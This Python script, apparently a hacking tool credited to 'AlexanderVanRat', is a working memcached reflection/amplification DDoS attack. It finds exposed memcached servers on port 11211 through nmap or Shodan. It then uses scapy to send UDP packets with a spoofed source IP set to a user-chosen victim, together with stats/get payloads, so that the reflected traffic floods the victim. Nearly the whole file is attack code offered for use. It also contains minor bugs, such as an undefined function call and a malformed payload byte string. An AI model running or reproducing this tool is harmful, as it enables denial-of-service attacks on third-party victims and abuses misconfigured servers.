#!/usr/bin/env python3

import sys, os, time, shodan, signal
import nmap
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout
import netifaces as ni
from xml.etree.ElementTree import fromstring, ElementTree
import re

os.system('cls' if os.name == 'nt' else 'clear')

print('''
                \033[91m                                                     __               ___  
                        /     \\   ____   _____   _________    ____  |  |_   ____   __| _/   
                      \\____|__  /\\___  >__|_|  /\\___  >____  /\\___  >___|  /\\___  >____ |    
                       /  \\ /  \\_/ __ \\ /     \\_/ ___\\__  \\ _/ ___\\|  |  \\_/ __ \\ / __ |    
                              \\/     \\/      \\/     \\/     \\/     \\/     \\/     \\/    \\/   
                      /    Y    \\  ___/|  Y Y  \\  \\___ / __ \\  \\___|   Y  \\  ___// /_/ |    
                                              
                \033[94m''')
time.sleep(0.2)
os.system('cls' if os.name == 'nt' else 'clear')

print('''
                \033[91m                                                     __               ___  
                        /     \\   ____   _____   _________    ____  |  |_   ____   __| _/   
                      /    Y    \\  ___/|  Y Y  \\  \\___ / __ \\  \\___|   Y  \\  ___// /_/ |    
                       /  \\ /  \\_/ __ \\ /     \\_/ ___\\__  \\ _/ ___\\|  |  \\_/ __ \\ / __ |    
                              \\/     \\/      \\/     \\/     \\/     \\/     \\/     \\/    \\/   
                      \\____|__  /\\___  >__|_|  /\\___  >____  /\\___  >___|  /\\___  >____ |    
                                              \033[92m by 
                \033[94m''')

time.sleep(0.2)
os.system('cls' if os.name == 'nt' else 'clear')

print('''
                \033[91m                                                     __               ___  
                        /     \\   ____   _____   _________    ____  |  |_   ____   __| _/   
                       /  \\ /  \\_/ __ \\ /     \\_/ ___\\__  \\ _/ ___\\|  |  \\_/ __ \\ / __ |    
                      /    Y    \\  ___/|  Y Y  \\  \\___ / __ \\  \\___|   Y  \\  ___// /_/ |    
                      \\____|__  /\\___  >__|_|  /\\___  >____  /\\___  >___|  /\\___  >____ |    
                              \\/     \\/      \\/     \\/     \\/     \\/     \\/     \\/    \\/   
                                              \033[92m by AlexanderVanRat
                \033[94m''')
   
@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield
#format ip
regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
#list of ips
ip_array = []
nm = nmap.PortScanner()

def Xml(host):
    #nmap scan
    nm.scan(hosts=host, arguments='--script=memcached-info -p 11211')
    #XML format
    tree = ElementTree(fromstring(nm.get_nmap_last_output()))
    root = tree.getroot()
    for host in root.findall('host'):
        for address in host.findall('address'):
            for ports in host.findall('ports'):
                for port in ports.findall('port'):
                    for script in port.findall('script'):
                        for elem in script.findall('elem'):
                           if elem.attrib =={'key': 'Authentication'}:
                            if(re.search(regex,address.get('addr'))):
                                print("IP:{} Auth: {}".format(address.get('addr'),elem.text))
                                ip_array.append(address.get('addr'))                              

def main():
    redpillbluepill = input("\033[91m[▸]\033[94m Would you like to search with shodan? (yes/[*]no):") or "no" 
    if redpillbluepill == "no":
        interface = input("\033[91m[▸]\033[94m Select interface ([*]wlan0/eth0): ") or "wlan0"#interface select
        try:
            ip = ni.ifaddresses('{}'.format(interface))[ni.AF_INET][0]['addr']
        except Exception as e:
            print("\033[94m[\033[97m!\033[94m]\033[91m Interface selected doesn't exist or doesn't have a valid INET")
            quit()
        print("Locally scanning for memcached\nYour local ip adress: {} on selected interface: {}".format(ip,interface))
        mask = input("\033[91m[▸]\033[94m Enter the mask ([*]/24): ") or "24"

        #host format for nmap
        host="{}/{}".format(ip,mask)
        Xml(host)
    else:
        API_KEY=input("SHODAN SEARCH\n\033[91m[▸]\033[94mEnter valid API key:")
        api = shodan.Shodan(API_KEY)
        try:
            result = str(api.search("11211"))
        except Exception as e:
            print("\033[94m[\033[97m!\033[94m]\033[91m INVALID API_KEY")
            quit()
        pattern = r"((([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])[ (\[]?(\.|dot)[ )\]]?){3}([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5]))"
        ips = [match[0] for match in re.findall(pattern, result)]
        wprint=input("\033[91m[▸]\033[94mWould you like to see the result of shodan search? ([*]yes/no): ") or "yes"
        if wprint=="yes":
            for x in range(len(ips)):
                print(ips[x])
        limit= input("\033[91m[▸]\033[94mDo you wish to limit results? ([*]yes/no): ") or "yes"
        if limit=="yes":
            hmc=input("\033[91m[▸]\033[94mWhat is the NO of ips? ([*]10): ") or 10
            for x in range(int(hmc)):
                Xml(ips[x])
        else:
            for x in range(len(ips)):
                Xmll(ips[x])
    if len(ip_array)<1:
            print("\033[94m[\033[97m!\033[94m]\033[91m The list of vulnerable ips is empty") 
            quit()           
    getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
    setdata = ("x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
    target = input("\033[91m[▸]\033[94m Enter target IP address: ")
    if not re.search(regex,target):
        print("\033[94m[\033[97m!\033[94m]\033[91m INVALID IP ADDRESS")
        quit()
    targetport = input("\033[91m[▸]\033[94m Enter target port number ([*]80): ") or "80"
    power = int(input("\033[91m[▸]\033[94m Enter preferred power ([*]1): ") or "1")
    res=input("\033[91m[▸]\033[94m CONTINUE?([*]yes/no): ") or "yes"
    if res=="yes":
        for i in ip_array:
            with suppress_stdout():
                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
    else:
        print("Bye!")
if __name__ == '__main__':
     try:
        main()
     except KeyboardInterrupt:
        print("\n\033[94m[\033[97m!\033[94m]\033[91m INTRERUPTED")